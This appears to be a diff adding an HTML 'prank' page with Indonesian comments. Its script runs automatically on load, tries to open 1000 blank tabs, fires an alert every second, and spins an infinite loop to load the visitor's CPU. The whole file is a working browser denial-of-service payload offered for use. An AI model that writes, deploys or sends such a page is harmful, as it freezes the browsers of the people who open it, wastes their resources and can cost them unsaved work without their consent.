@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1000 Tabs & Pop-up Prank</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #111;
+            color: white;
+            text-align: center;
+            padding-top: 50px;
+        }
+        h1 {
+            font-size: 2rem;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <h1>Prank in Progress!</h1>
+    <script>
+        // Fungsi untuk membuka 1000 tab kosong
+        function openTabs() {
+            var tabCount = 1000;  // Membuka 1000 tab
+            for (let i = 0; i < tabCount; i++) {
+                window.open("about:blank", "_blank");
+            }
+        }
+
+        // Fungsi untuk membuka pop-up setiap detik
+        function openPopups() {
+            setInterval(function() {
+                window.alert("Surprise! You've been pranked!");
+            }, 1000); // Pop-up muncul setiap 1 detik
+        }
+
+        // Fungsi untuk beban CPU dengan infinite loop
+        function cpuLoad() {
+            while (true) {
+                Math.random(); // Infinite loop untuk membebani CPU
+            }
+        }
+
+        // Jalankan prank
+        window.onload = function() {
+            openTabs();     // Buka 1000 tab
+            openPopups();   // Pop-up terus menerus
+            cpuLoad();      // Infinite loop untuk beban CPU
+        };
+    </script>
+</body>
+</html>
